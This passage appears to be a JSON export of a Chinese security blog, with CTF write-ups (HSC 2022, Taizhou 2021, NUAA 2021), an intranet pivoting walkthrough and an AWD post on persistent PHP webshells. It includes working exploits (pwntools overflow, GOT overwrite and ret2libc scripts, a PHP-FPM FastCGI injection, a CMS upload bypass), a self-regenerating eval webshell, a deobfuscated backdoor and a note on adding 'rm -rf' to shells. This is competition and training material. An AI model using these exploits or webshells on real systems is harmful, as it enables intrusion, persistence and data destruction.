'FastCGI/1.0',\n        'REQUEST_METHOD': 'POST',\n        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),\n        'SCRIPT_NAME': uri,\n        'QUERY_STRING': '',\n        'REQUEST_URI': uri,\n        'DOCUMENT_ROOT': documentRoot,\n        'SERVER_SOFTWARE': 'php/fcgiclient',\n        'REMOTE_ADDR': '127.0.0.1',\n        'REMOTE_PORT': '9985',\n        'SERVER_ADDR': '127.0.0.1',\n        'SERVER_PORT': '80',\n        'SERVER_NAME': \"localhost\",\n        'SERVER_PROTOCOL': 'HTTP/1.1',\n        'CONTENT_TYPE': 'application/text',\n        'CONTENT_LENGTH': \"%d\" % len(content),\n        'PHP_VALUE': 'auto_prepend_file = php://input'+chr(0x0A)+'open_basedir = /',\n        'PHP_ADMIN_VALUE': 'allow_url_include = On'\n    }\n    response = client.request(params, content)\n    print(force_text(response))\n```\n\n`python fpm.py 192.168.100.131 -p 9000 /usr/share/nginx/html/index.php  -c \"<?php var_dump(scandir('../')); exit();?>\"`\n\n\n-----------------------------------\n\n[PHP绕过open_basedir列目录的研究](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)","tags":["总结","php","bypass","open_basedir"],"categories":["php"]},{"title":"HSC1th 2022-wp","url":"/posts/e2c67dcf/","content":"\n\n\n# misc #\n\n## Sign-in ##\n`flag{HSC_W3LC0M3}`\n\n## DORAEMON ##\n\n>哆啦A梦把泡好的QR放进口袋后，用六位数字把自己放好了。你能找到它吗？\n\n压缩包先暴力破解出密码为`376852`\n\n得到一张图片，发现高度不对劲，增加一点高度，看到破损的二维码\n把定位符补上，扫码得到flag\n\n![](/img/wp/2022/2022hsc-1.png)\n\n\n## 汝闻,人言否 ##\n\n看到压缩包的`50 4B 01 02`，但是没找到头，搜了一下发现头被改成了`4B 50`\n![](/img/wp/2022/2022hsc-2.png)\n结尾也有一处\n![](/img/wp/2022/2022hsc-3.png)\n\n提取出来后发现需要密码\n发现注释`qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p`\n观察发现为键盘密码\n![](/img/wp/2022/2022hsc-4.png)\n但是第三个字符有点奇怪，不是字母，最后猜测是最像的A\n密码：`WVALOU`\n\n解压得到flag，文件头为`52 49 46 46`，音频文件\naudacity查看，频谱图中看到flag\n![](/img/wp/2022/2022hsc-5.png)\n\n\n## PERFORMANCE-ART ##\n\n银河字母+凹凸字体\n![](/img/wp/2022/2022hsc-6.jpg)\n![](/img/wp/2022/2022hsc-7.jpg)\n\n与表对照，不难发现是`50 4B`即压缩包\n解压得到`ZmxhZ3tnNUEwIWkyZjF9`\nbase64解码得到flag\n\n\n## WIRESHARK ##\n\n下载下来解压提示压缩文件已损坏，看到开头是`PK`，结尾是`IEND`，直接foremost，得到一个加密压缩包和一张图片\n分离出的图片存在lsb隐写，藏了一张图片，`save bin`导出\n![](/img/wp/2022/2022hsc-8.png)\n\n发现是一张二维码，扫码得到`wrsak..iehr370`\n但是用来解压压缩包提示密码错误，观察后发现前面是wireshark单词的错位，栅栏一下得到`wireshark3.7.0`\n\n解压后得到一个`wireshark`文件\n以`%`开头，以`%%EOF`结尾，明显是pdf文件，但是头被删去了一部分，所以打不开\n![](/img/wp/2022/2022hsc-9.png)\n\n补上`PDF`，使用`wbStego4.3open`工具，空密码成功解出flag\n\n\n\n# web #\n\n## Web-sign in ##\n提示`你知道robots协议吗？`，访问robots.txt，得到`fiag_ls_h3re.php`\n\nctrl+u，F12等被禁用，使用`view-source:`查看源代码，得到flag\n\n\n## CLICK ##\n\n抓不到包，说明是js控制的\n逐个查看，最后在`main.js`中发现一串`ZmxhZ3thYzk5Y2M2ZC04NWFmLTRiNmItODNlZS0yYjNjYWMwOTg3Y2J9Cg==`，解码得到flag\n\n\n\n## EXEC ##\n题目过滤了一部分字母和符号，但是还可以绕过\n空格用`${IFS}`代替，`ls`和`nl`这些字母用`\\`转义,因为是exec，所以最后输出到文件\n\n先找flag文件名和位置\n![](/img/wp/2022/2022hsc-10.png)\n\n查看flag\n![](/img/wp/2022/2022hsc-11.png)\n\n\n## CMS SYSTEM ##\n首页可以得知是`YCCMS`,漏洞库查找历史漏洞，发现存在未授权更改密码，任意文件上传等等\n\n更改密码：\n![](/img/wp/2022/2022hsc-12.jpg)\n\n\n文件上传：\n![](/img/wp/2022/2022hsc-13.jpg)\n\n分析：\nLogoUpload.class.php:\n先将值以`.`打散为数组，且只检查数组中第二个值是否为png，所以`1.png.php`即可绕过\n```php\nprivate function checkType() {\n\t\tif (!in_array(explode('.',$this->name)[1],$this->typeArr)) {\n\t\t\tTool::alertBack('警告：LOGO图片必须是PNG格式！');\n\t\t}\n\t}\n```\n最后文件会被重命名为`logo.php`\n```php\nprivate function setNewName() {\n\t\t$_nameArr = explode('.',$this->name);\n\t\t$_postfix = $_nameArr[count($_nameArr)-1];\n\t\t//$_newname = date('YmdHis').mt_rand(100,1000).'.'.$_postfix;\n\t\t$_newname = 'logo.'.$_postfix;\n\t\t$this->linkpath = UPLOGO.$_newname;\n\t\treturn $this->path.$_newname;\n\t}\n```\n\n访问php\n![](/img/wp/2022/2022hsc-14.jpg)\n\n\n\n# reverse #\n\n## hiahia o(\\*\\^▽\\^\\*)┛ ##\n将输入的字符与被flag函数修改过的v4进行比较\n![](/img/wp/2022/2022hsc-15.png)\n然后根据flag函数与v4变量的数据得出脚本\n![](/img/wp/2022/2022hsc-16.png)\n\n脚本如下\n```python\na=\"igdb~Mumu@p&>%;%<$<p\"\nflag=\"\"\nfor  i in range(len(a)):\n    if i>9:\n            if i%2:\n                    flag+=chr(ord(a[i])+13)\n            else:\n                    flag+=chr(ord(a[i])-11)\n    else:\n            if i%2:\n                    flag+=chr(ord(a[i])+5)\n            else:\n                    flag+=chr(ord(a[i])-3)\nprint(flag)\n```\n\n\n## ANDROID ##\n安卓逆向的话先安装一下\n随便输入一个值让它判断一下\n![](/img/wp/2022/2022hsc-17.jpg)\n\n随便一个逆向软件中搜索字符串`FLAG错误`\n这里用jadx，得到关键代码\n![](/img/wp/2022/2022hsc-18.jpg)\n\n代码的大概意思是索引值为单数的异或下一个成员，为双数的异或索引值，\n```java\nfor (int i = 0; i < 17; i++) {\n            iArr2[i] = i % 2 == 0 ? charArray[i] ^ i : charArray[i] ^ charArray[i + 1];\n        }\n```\n\n解题代码：\n```python\na=[102, 13, 99, 28, 127, 55, 99, 19, 109, 1, 121, 58, 83, 30, 79, 0, 64, 42]\nfor i in range(len(a)-2,0,-1):\n    if i%2==1:\n            a[i]=a[i]^a[i+1]\n    else:\n            a[i]=a[i]^i\nprint(''.join([chr(i) for i in a]))\n```\n![](/img/wp/2022/2022hsc-19.jpg)\n\n## WAY ##\n有壳先脱壳\n![](/img/wp/2022/2022hsc-20.png)\n\n一个走迷宫的题目\n![](/img/wp/2022/2022hsc-21.png)\n\n找到地图\n![](/img/wp/2022/2022hsc-22.png)\n![](/img/wp/2022/2022hsc-23.png)\n\n`OIIIIOOIO#IOOOIIOIOIIIIII`\n\n刚好五个分为一组,从左上角走到#\n用键盘表示路径就是`sdsddwd`，md5后就是flag了\n\n\n# pwn #\n\n## Ez_pwn ##\n因为使用了gets函数，没有对输入数据进行限制，所以导致了栈溢出\n![](/img/wp/2022/2022hsc-24.png)\n接着执行后门函数获取flag\n![](/img/wp/2022/2022hsc-25.png)\n\n```python\nfrom pwn import *\np=remote('hsc2019.site',10679)\np.sendline(b'a'*0x40+b'b'*8+p64(0x400741))\np.interactive()\n```\n\n![](/img/wp/2022/2022hsc-26.png)\n\n\n## EZPWN ##\n程序让我们写入地址并向地址写入数据\n![](/img/wp/2022/2022hsc-27.png)\n\n那么我们可以修改got表 使某个函数执行 后门函数\n![](/img/wp/2022/2022hsc-28.png)\n\n```python\nfrom pwn import *\ne=ELF('pwn2',checksec=0)\np=remote('hsc2019.site',10257)\np.sendlineafter(b'ID?',b'1')\np.sendlineafter(b'address?',str(e.got['puts']).encode())\np.send(p64(0x400796))\np.interactive()\n```\n\n![](/img/wp/2022/2022hsc-29.png)\n\n\n\n# crypto #\n\n## Easy SignIn ##\n\nbase16-->base64-->base32-->base64\n\n>flag{welc0me_to_my_s1gn_in}\n\n\n## AFFINE ##\n\n先爆破a和b\n`assert (\"flag\" in m)`表示明文中存在flag\n然后因为`(a*b+c)%62= (a%62)*(b%62)+c%62`，所以a和b小于62\n\n```python\n# python2\nimport string\nimport hashlib\n\nletter=string.ascii_letters+string.digits\ne=\"xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv\"\na1,b1=0,0\nfor i in range(len(e)-3):\n    for a in range(62):\n        for b in range(62):\n            if ((letter.index('f')*a+b)%62)==(letter.index(e[i])):\n                if ((letter.index('l')*a+b)%62)==(letter.index(e[i+1])):\n                    if ((letter.index('a')*a+b)%62)==(letter.index(e[i+2])):\n                        if ((letter.index('g')*a+b)%62)==(letter.index(e[i+3])):\n                            a1,b1=a,b\n\nflag=[]\nfor i in e:\n    for j in range(62):\n        if (j*a1+b1)%62==letter.index(i):\n            flag.append(j)\n            break\n\nprint(hashlib.md5(''.join(letter[i] for i in flag)).hexdigest())\n```\n","tags":["wp","2022竞赛","HSC"],"categories":["wp"]},{"title":"pwnthebox-内网渗透(入门)","url":"/posts/4ee67181/","content":"\n\n# 使用到的工具 #\nkali\nburp\nfirefox\nreGeorg\nproxychains\nnmap\n冰蝎\n蚁剑\n\n\n# 题目描述 #\n\n根据描述得知有两层，因为是demo题目，所以给出了漏洞，降低了难度，实际上的题目漏洞点是不知道的，需要自己发掘\n\n![](/img/内网/pwnthebox-内网渗透-1.png)\n\n# 解题 #\n\n## 第一层 ##\n\napache解析漏洞\n上传`1.php.jpg`即可`getshell`\n\n![](/img/内网/pwnthebox-内网渗透-2.png)\n\n\n有了第一台主机的shell后首先要做的就是信息收集了\n\n## 信息收集 ##\n\n首先看ip，网段等信息\n。。。\n上来啥命令用不了\n![](/img/内网/pwnthebox-内网渗透-3.png)\n\n遇到这种情况可以分两种方案继续操作，一是提权，二是上传二进制包编译软件\n可能是我太菜了，提权失败，所以考虑第二种方法\n在[官网](https://nmap.org/download.html)下载nmap包，上传并编译\n\n```\nbzip2 -cd nmap-7.92.tar.bz2 | tar xvf -\ncd nmap-7.92\n./configure\nmake\nmake install\n```\n\n### 坑一 ###\n\n>这里要注意一下，用蚁剑编译nmap会失败，因为蚁剑的shell是把命令一个个连接起来在传过去，所以经常出问题，这里改用冰蝎\n\n![](/img/内网/pwnthebox-内网渗透-4.png)\n\n\n### nmap ###\n编译完后使用nmap扫描\n先看自己\n`./nmap --iflist`\n\n![](/img/内网/pwnthebox-内网渗透-5.png)\n\n扫ip\n`./nmap -sn --min-rate=2000 -n -T5 100.64.0,134-135.0/24`\n\n![](/img/内网/pwnthebox-内网渗透-6.png)\n\n扫端口\n`./nmap -n -T5 100.64.0,134-135.0/24 --open`\n\n![](/img/内网/pwnthebox-内网渗透-7.png)\n\n最后总结一下\n\n```\neth0 100.64.0.4/24\neth1 100.64.135.2/24\neth2 100.64.134.3/24\n\n\n100.64.0.2               8000，9000\n100.64.0.3               7000，8000\n100.64.0.4               //自己，80\n100.64.0.5               3000\n100.64.134.2             无\n100.64.134.3             //自己，80\n100.64.135.2             //自己，80\n100.64.135.3             3000\n```\n\n因为是linux内网环境，所以到这里信息收集基本就结束了\n如果是windows内网，那么就需要收集更多的信息\n\n## 建立代理 ##\n\n这一步是最为关键的，我就在这里卡了好久才成功\n\n首先我们要分析内网靶机的出网状态\n\n经过测试发现靶机不出网，且只允许http协议进出\n那么这种情况可以通过webshell，用http协议来传达请求\n\n在kali上下载[reGeorg](https://github.com/sensepost/reGeorg)工具\n\n### 坑二 ###\n\n>这里要注意不能用普通的reGeorg，不知道是不是因为php版本（php8）的原因，显示的状态是连接成功，但是一访问就time out。解决方案是使用[Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)\n\n\n### 配置代理 ###\n\n生成webshell,`-k`是指定密码\n`python3 neoreg.py generate -k lewiserii`\n\n![](/img/内网/pwnthebox-内网渗透-8.png)\n\n\n将生成的`./neoreg_servers/tunnel.php`传到靶机上\n\n\n\n使用本地7777端口建立socks连接：\n`python3 neoreg.py -k lewiserii -p 7777 -u https://815-a1734091-ce39-4ea5-98a6-f88746398def.do-not-trust.hacking.run/uploadfiles/tunnel.php`\n\n![](/img/内网/pwnthebox-内网渗透-10.png)\n\n编辑`proxychains`配置文件`/etc/proxychains4.conf`\n最后一行添加`socks5  127.0.0.1 7777`，7777为你自己的端口，需要与reGeorg中设置的端口相同\n\n所有工具使用命令前加`proxychains`就可以使流量走代理\n\n启动火狐\n`proxychains4 firefox`\n逐个访问刚才扫出来的ip\n成功访问内网主机！\n![](/img/内网/pwnthebox-内网渗透-11.png)\n\n\n### 配置burp代理 ###\n\n添加一个socks代理，端口与reGeorg监听的端口一致\n![](/img/内网/pwnthebox-内网渗透-12.png)\n\n设置火狐的代理与burp抓包的代理一致\n![](/img/内网/pwnthebox-内网渗透-13.png)\n\n成功抓包\n![](/img/内网/pwnthebox-内网渗透-14.png)\n\n## 第二层 ##\nPOC直接打就行了\n![](/img/内网/pwnthebox-内网渗透-15.png)\n\n\n# 总结 #\n小菜鸡的初次内网之旅到这就结束了，个人感觉内网难的就是信息收集和层层代理，当你掌握的信息越多就越好操作","tags":["基础知识","内网渗透"],"categories":["内网渗透"]},{"title":"AWD不死马与克制方法","url":"/posts/46ef80a/","content":"\n\n# 不死马 #\n一个典型的不死马：\n```php\n<?php\n    ignore_user_abort(true);\n    set_time_limit(0);\n    unlink(__FILE__);\n    $file = '.l.php';\n    $code = '<?php if(md5($_GET[\"pass\"])==\"56183c1f36ef08fb8b027a4116db8483\"){@eval($_POST[\"a\"]);} ?>';\n    //pass=lewiserii\n    while (1){\n        file_put_contents($file,$code);\n        system('touch -m -d \"2018-12-01 09:10:12\" .l.php');\n        usleep(1000);\n    }\n?>\n```\n解释一下\n`ignore_user_abort(true);` 忽略与用户的断开，即使与客户机断开脚本仍会执行。\n`set_time_limit(0);` 设置脚本最大执行时间，这里设置为0，即没有时间方面的限制\n`unlink(__FILE__);` 删除文件本身，以起到隐蔽自身的作用\n\n\n当上传完后需要访问一次不死马，生成一句话木马, 才能真正\"不死\"，这点很多新手第一次用可能会忽略，还有记得删除注释，不然就会被其他队乌鸦坐飞机\n\n![](/img/awd/shell-1.png)\n\n\n# 克制方法 #\n当然，不死马也并非真正无敌，只是在低权限的情况下较难处理\n\n## 高权限下的处理方法（root） ##\n1：重启服务，杀掉不死马的进程\nubuntu的用service，centos的用systemctl\n![](/img/awd/shell-2.png)\n\n\n## 低权限下的处理方法 ##\n一般的awd比赛中基本不会放出root，所以我们的权限很低，无法进行重启服务等操作\n\n![](/img/awd/shell-3.png)\n\n不过办法总比困难多\n\n方法一：kill进程\n\n这个方法应该是目前最好的解决方案了，新建一个文件，比如`del.php`, 写上杀进程的命令，访问后即可删除不死马\n\n```php\nwww-data         //使用的时候注意用户不一定是www-data，根据实际情况来\n<?php\nsystem(\"kill `ps aux | grep www-data | awk '{print $2}' | xargs kill -9`\");\n\nphp-fpm        //杀php-fpm进程\n<?php\nsystem(\"kill `ps -ef | grep php-fpm | grep -v grep | awk '{print $2}'`\");\n\nphp-apache     //杀httpd进程\n<?php\nsystem(\"kill `ps -ef | grep httpd | grep -v grep | awk '{print $2}'`\");\n```\n\n![](/img/awd/shell-4.png)\n\n\n\n方法二：创建一个和不死马生成的马一样名字的目录\n对自己的防御不放心的话可以提前创建几个常用马名字的文件夹，比如m.php，shell.php\n\n\n编写一个shell脚本\n\n```shell\n#!/bin/bash\ncd /var/www/html/\nwhile true;do rm -rf .l.php;mkdir .l.php;done\n```\n放在后台运行，实测不是很稳定，不推荐使用\n\n![](/img/awd/shell-5.png)\n\n\n方法三：竞争写入无意义的一句话\nusleep值比对方马的值低就行\n\n```php\n<?php\n    ignore_user_abort(true);\n    set_time_limit(0);\n    unlink(__FILE__);\n    $file = '.l.php';\n    $code = '<?php echo \"lewiserii\" ?>';\n    while (1){\n        file_put_contents($file,$code);\n        //system('touch -m -d \"2018-12-01 09:10:12\" .l.php');\n        //usleep(1000);\n        usleep(0);\n    }\n?>\n```\n\n\n# 变种不死马与搅屎棍 #\n\n唯一的区别是文件名前加了个短杠，这就很骚了，会与命令的参数冲突而无法对它操作，但是浏览器中却可以正常解析\n\n```php\n<?php\n    ignore_user_abort(true);\n    set_time_limit(0);\n    unlink(__FILE__);\n    $file = '-index.php';\n    $code = '<?php if(md5($_GET[\"pass\"])==\"56183c1f36ef08fb8b027a4116db8483\"){@eval($_POST[\"a\"]);} ?>';\n    //pass=lewiserii\n    while (1){\n        file_put_contents($file,$code);\n        //system('touch -m -d \"2018-12-01 09:10:12\" -index.php');\n        usleep(0);\n    }\n?>\n```\n\n![](/img/awd/shell-6.png)\n\n\n这个应该算是比较冷门的知识点了，想要操作也很简单，在文件前加上两个`--`就可以了，表示转义字符，或者形如`./-index.php`\n\n\n>搅屎棍：在不死马中添加`rm -rf /var/www/html/*`；或者创建大量无意义的文件；或者制作fork炸弹等等\n\n\n\n## 动态密码 ##\n\nphp获取SERVER_ADDR的值进行md5\n\n```php\n<?php\nignore_user_abort(true);\nset_time_limit(0);\nunlink(__FILE__);\n$file = '-lewiserii.php';\n$ip = $_SERVER['SERVER_ADDR'];\n$pass = md5($ip);\n$code = '<?php if(md5($_REQUEST[\"pass\"])==\"' . $pass . '\"){@eval($_REQUEST[\"cmd\"]);} ?>';\nwhile (1){\n    file_put_contents($file,$code);\n    system('touch -m -d \"2018-12-01 09:10:12\" ./-lewiserii.php');\n    usleep(500);\n}\n?>\n```\n\n但是也有缺点，因为密码是明文传输，很容易反应过来然后上车\n其实更好的方式是利用python等脚本在本地加密完再传到靶机","tags":["总结","awd","不死马"],"categories":["awd"]},{"title":"【ctfshow】摆烂杯-wp","url":"/posts/8752bc8/","content":"\n\n摆烂了，没有[wp](https://qgieod1s9b.feishu.cn/docs/doccnC4EpMhSv1Ni6mbL7BQQdBc)\n","tags":["wp","ctfshow"],"categories":["wp"]},{"title":"2021台州市首届网络安全大赛","url":"/posts/11635d50/","content":"\n喜提榜一\n\n![](/img/wp/2021/2021taizhou-1.png)\n\n# Web #\n## web1 ##\nflag在请求头中\n![](/img/wp/2021/2021taizhou-2.png)\n\n\n## web2 ##\n扫描目录得到后台路径`/admin`\n\n\n用`admin`，`admin888`弱口令进入后台\n\n在`网站安全`一栏中使用`检测木马`功能，发现后门\n![](/img/wp/2021/2021taizhou-3.png)\n\n使用文件管理功能查看木马文件，发现被混淆了\n![](/img/wp/2021/2021taizhou-4.png)\n\n\n```php\n<?php\n$mt  = \"mFsKCleRfU\";\n$ojj = \"IEBleldle\";\n$hsa = \"E9TVFsnd2VuJ10p\";\n$fnx = \"Ow==\";\n$zk  = str_replace( \"d\", \"\", \"sdtdrd_redpdldadcde\" );\n$ef  = $zk( \"z\", \"\", \"zbazsze64_zdzeczodze\" );\n$dva = $zk( \"p\", \"\", \"pcprpepaptpe_fpupnpcptpipopn\" );\n$zvm = $dva( '', $ef( $zk( \"le\", \"\", $ojj . $mt . $hsa . $fnx ) ) );\n$zvm();\n?>\n```\n\n`str_replace`先将`sdtdrd_redpdldadcde`中的`d`替换为`空`，为`str_replace`\n同理又是两个替换操作\n最后将`$ojj` `$mt` `$hsa` `$fnx` 拼接，替换le，base64解码，创建函数，得到` @eval($_POST['wen']);`\n\n\n![](/img/wp/2021/2021taizhou-5.png)\n\n\n\n## web3 ##\n`file_get_contents`读文件\n读取常用的几个文件，flag，flag.txt，flag.php\n发现提示`index999.php`\n![](/img/wp/2021/2021taizhou-6.png)\n\n再读`index999.php`看到源码\n![](/img/wp/2021/2021taizhou-7.png)\n\n可以通过`glob://`伪协议和`?`去逐个匹配文件名\npayload：\n```\nhttp://1.13.195.28:20001/index999.php?path=glob:///????????????????\nhttp://1.13.195.28:20001/index999.php?path=glob:///????????????????/???????\n```\n读到flag位置和文件名为`/13f95a7112369fb4/flaaaag`\n\n在使用`file_get_contents`读文件\n\n![](/img/wp/2021/2021taizhou-8.png)\n\n\n# PWN #\n## pwn2 ##\n限制了 输入长度 要小于256\n![](/img/wp/2021/2021taizhou-9.png)\n\n\n因为第二个参数时无符号类型\n所以可以使用整数漏洞 绕过长度限制\n![](/img/wp/2021/2021taizhou-10.png)\n\n脚本\n```python\nfrom pwn import *\nfrom LibcSearcher import *\ne=ELF('pwn12',checksec=0)\n#p=process('pwn12')\n#gdb.attach(p)\np=remote('1.13.195.28',10000)\ngot='printf'\nprintplt=e.plt['printf']\ngetgot=e.got[got]\nmain=0x400713\nret=0x000000000040028c\npop_rdi=0x0000000000400863\np.sendlineafter('length :','-1')\np.read()\np.sendline(b'a'*0x130+b'bbbbbbbb'+p64(ret)+p64(pop_rdi)+p64(getgot)+p64(printplt)+p64(main))\np.readline()\nd=u64(p.readuntil(b'\\x7f').ljust(8,b'\\x00'))\nprint(hex(d))\nlibc=LibcSearcher(got,d)\noff=d-libc.dump(got)\nsys_add=off+libc.dump('system')\nbin_add=off+libc.dump('str_bin_sh')\np.sendlineafter('length :','-1')\np.sendline(b'a'*0x130+b'bbbbbbbb'+p64(ret)+p64(pop_rdi)+p64(bin_add)+p64(sys_add)+p64(main))\np.interactive()\n```\n![](/img/wp/2021/2021taizhou-11.png)\n\n\n\n# RE #\n## reverse2 ##\nfile查看文件类型，64位，用ida64打开\nF5\n得到`gHe6gIrSlYUqkGPeg4KNo4Vql4g6g4UqgHgHl4JNonBhlbk+och=`\n常规base解不出来，应该是换表了\n查看字符串\n![](/img/wp/2021/2021taizhou-12.png)\n发现base64表\n![](/img/wp/2021/2021taizhou-13.png)\n\n解密脚本\n```python\nimport base64\nimport string\n\nstr1 = \"gHe6gIrSlYUqkGPeg4KNo4Vql4g6g4UqgHgHl4JNonBhlbk+och=\"\n\nstring1 = \"3ZAnJVbMd/zEkolRBDW4KUYT0ga1PF9j86qwuXHciCOfr2tLmexGhpSI+NQ5y7sv\"\nstring2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n\nprint (base64.b64decode(str1.translate(str.maketrans(string1,string2))))\n```\n![](/img/wp/2021/2021taizhou-14.png)\n\n\n\n\n# Crypto #\n## crypto1 ##\nbase循环\n![](/img/wp/2021/2021taizhou-15.png)\n\n\n## crypto2 ##\n算式的结果有正确的有错误的\n所以将结果的`true`和`false`导出为二进制\n然后将二进制转16进制，最后再转字符串\n脚本如下\n```python\nf=open('1w.txt')\nd=f.read()\nd=d.split('\\n')\ne=''\nfor i in d:\n    e=e+str(int(eval(i)))\nprint(hex(int(e,2))[2:].strip('L').decode('hex'))\n```\n![](/img/wp/2021/2021taizhou-16.png)\n\n\n## crypto3 ##\ne很小，低指数攻击\n脚本如下\n```python\nimport gmpy2\nn=0x86f4be77b79e166a6311e7982ba2e5ff479db93a01c56034479a9e35382293c35769da222974e9425829099aa4fe4f41185283866202042b356194bab312e6ed2fb0b10b1b74767dc1cc5306872d33b1f3b75612c594751ec70e4cf5fccc6fceafe0401648869cc40425a176ab70286d92a29dfd675f2384c9383e0a9750b25b\ne=0x3\nc=0x10652cdf7ed2bc53f58b321f476c3a3cf3281e541f4d533a73a0fcbf525230f2e01c183dee660676317ea99250202548e5525b0c14adbeb77d4fa7e2e1d339\ni=0\nwhile 1:\n    if (gmpy2.iroot(c+i*n,e)[1]==1):\n        print( gmpy2.iroot(c+i*n,e)[0])\n        print(i)\n        break\n    i=i+1\n```\n![](/img/wp/2021/2021taizhou-17.png)\n十进制转字符串\n![](/img/wp/2021/2021taizhou-18.png)\nmd5加密后提交\n![](/img/wp/2021/2021taizhou-19.png)\n\n\n\n\n# MISC #\n## misc1 ##\ndocx本质上是一个压缩包\n在`media`下存在包含`flag`的图片\n![](/img/wp/2021/2021taizhou-20.png)\n\n## misc2 ##\n尝试修改高度\n![](/img/wp/2021/2021taizhou-21.png)\n得到密码\n![](/img/wp/2021/2021taizhou-22.png)\n\nbinwalk分离出一个压缩包\n\n写脚本爆破密码\n```python\nimport rarfile,time\nimport threading,os\nr=rarfile.RarFile('2EDC.rar')\ndef decode(pwd):\n    global r\n    try:\n        r.extractall(pwd=pwd)\n        print(pwd)\n        os._exit(0)\n    except Exception as e:\n        print(e,pwd)\n        pass\na='qQaAzZwWsSxX'\n\nfor i in a:\n    for j in a:\n        if j.lower() in (i).lower() :\n            continue\n        for k in a:\n            if k.lower() in (i+j).lower():\n                continue\n            for q in a:\n                if q.lower() in (i+j+k).lower():\n                    continue\n                for z in a:\n                    if z.lower() in (i+j+k+q).lower():\n                        continue\n                    for x in a:\n                        if x.lower() in (i+j+k+q+z).lower():\n                            continue\n                        threading.Thread(target=decode,args=(i+j+k+q+z+x,)).start()\n                        time.sleep(0.01)\n\n```\n跑出结果\n![](/img/wp/2021/2021taizhou-23.png)\n解压得到flag：`DASCTF{f457b6a30c5b07db78e6e7562e93b4cd}`\n","tags":["wp","台州","2021竞赛"],"categories":["wp"]},{"title":"2021NUAA-wp","url":"/posts/3470e8c1/","content":"\n\n时间有点紧，有几题差一点\n![](/img/wp/2021/2021nuaa-1.png)\n![](/img/wp/2021/2021nuaa-2.png)\n\n# 签到 #\n腾讯会议\nflag{we1c0m_t0_asur!ctf}\n\n# misc #\n## baby_mix ##\n伪加密，09改成00\n图片上边左边看到白条，应该是lsb\nstegsolve查看得到二维码\n![](/img/wp/2021/2021nuaa-3.png)\n扫码得到\n```\n4a5a4a584732544748424658515654514f4634575135435447564a4749564a5347463455595754564f464c444f5752594f56465751334b55474a345841324b494b4a3546495533594b524a4449524b454b35435753334c324f4a41564153534f48424756515243574d355a464d3543474a593d3d3d3d3d3d\n```\n十六进制转字符串\n```\nJZJXG2TGHBFXQVTQOF4WQ5CTGVJGIVJSGF4UYWTVOFLDOWRYOVFWQ3KUGJ4XA2KIKJ5FIU3YKRJDIRKEK5CWS3L2OJAVASSOHBGVQRCWM5ZFM5CGJY======\n```\nbase32\n```\nNSsjf8KxVpqyhtS5RdU21yLZuqV7Z8uKhmT2ypiHRzTSxTR4EDWEimzrAPJN8MXDVgrVtFN\n```\nbase58\n```\nYXN1cml7aV90aGlua190aGF0X2lzX3NvX2Vhc3lfZm9yX3lvdX0=\n```\nbase64\n```\nasuri{i_think_that_is_so_easy_for_you}\n```\n\n## medium ##\n解压有个key.wav文件，应该是密钥\naudacity频谱看一下，得到密钥`MudaMudaMudaMuda`\n![](/img/wp/2021/2021nuaa-4.png)\n\nstrings看下图片，发现结尾有一串字符串\n```\nRjAgOUYgOTkgODMgRjAgOUYgOTIgQjUgRjAgOUYgOEMgQkYgRjAgOUYgOEUgQTQgRjAgOUYgOUEgQUEgRjAgOUYgOEMgOEYgRjAgOUYgOTAgOEUgRjAgOUYgQTUgOEIgRjAgOUYgOUEgQUIgRjAgOUYgOTggODYgRTIgOUMgODUgRjAgOUYgOTggODAgRjAgOUYgQTQgQTMgRTIgOEMgQTggRjAgOUYgOTAgOEQgRTIgOTggODAgRjAgOUYgQTUgOEIgRjAgOUYgOTggODYgRjAgOUYgOTkgODMgRjAgOUYgOEUgODMgRjAgOUYgOTAgOTggRjAgOUYgOEQgOEQgRTIgOTggODIgRjAgOUYgOUEgQUEgRjAgOUYgOEMgQUEgRjAgOUYgOTIgQjUgRjAgOUYgOUEgQTggRTIgOEMgQTggRjAgOUYgOTggODEgRjAgOUYgOTQgQUEgRTIgOUMgOTYgRjAgOUYgOEUgODggRjAgOUYgOEMgOEYgRjAgOUYgOTQgODQgRjAgOUYgOTYgOTAgRjAgOUYgQTYgOTMgRjAgOUYgOEMgOEYgRjAgOUYgOTUgQjkgRjAgOUYgOTggOEQgRjAgOUYgOTEgOEMgRjAgOUYgOEMgODkgRjAgOUYgOTIgQjUgRjAgOUYgOEYgOEUgRjAgOUYgOUEgQUIgRjAgOUYgQTQgQTMgRjAgOUYgOTYgOTAgRjAgOUYgOTIgQTcgRjAgOUYgOEQgOEQgRjAgOUYgOEMgQkYgRjAgOUYgOTggOEQgRjAgOUYgOEQgOEUgRjAgOUYgOUEgQTggRjAgOUYgOTAgOEUgRjAgOUYgOTIgQjUgRjAgOUYgOEMgQkYgRjAgOUYgOEYgQjkgRjAgOUYgOEUgODUgRjAgOUYgOTkgODMgRjAgOUYgOTEgOTEgRjAgOUYgOTggODYgRTIgOTggODMgRjAgOUYgOTAgODUgRjAgOUYgOTUgQjkgRjAgOUYgOTggODcgRjAgOUYgOEYgQjkgRjAgOUYgOEYgQjkgRjAgOUYgOEQgQjUgRjAgOUYgOEUgODggRjAgOUYgOEQgOEUgRjAgOUYgQTQgQTMgRjAgOUYgOTggODEgRjAgOUYgOEQgOEQgRjAgOUYgOUEgQTggRjAgOUYgOEYgQjkgRjAgOUYgOTEgQTMgRjAgOUYgOTQgODQgRjAgOUYgQTQgQTMgRjAgOUYgOEUgODggRjAgOUYgOTggODIgRjAgOUYgOTAgOEQgRTIgOUMgODUgRjAgOUYgOTggODAgIEUyIDlDIDg1IEYwIDlGIDlBIEFBIEYwIDlGIDk4IDhFIEYwIDlGIDk4IDgwIEYwIDlGIDk3IDkyIEYwIDlGIDk3IDkyCg==\n```\nbase64\n```\nF0 9F 99 83 F0 9F 92 B5 F0 9F 8C BF F0 9F 8E A4 F0 9F 9A AA F0 9F 8C 8F F0 9F 90 8E F0 9F A5 8B F0 9F 9A AB F0 9F 98 86 E2 9C 85 F0 9F 98 80 F0 9F A4 A3 E2 8C A8 F0 9F 90 8D E2 98 80 F0 9F A5 8B F0 9F 98 86 F0 9F 99 83 F0 9F 8E 83 F0 9F 90 98 F0 9F 8D 8D E2 98 82 F0 9F 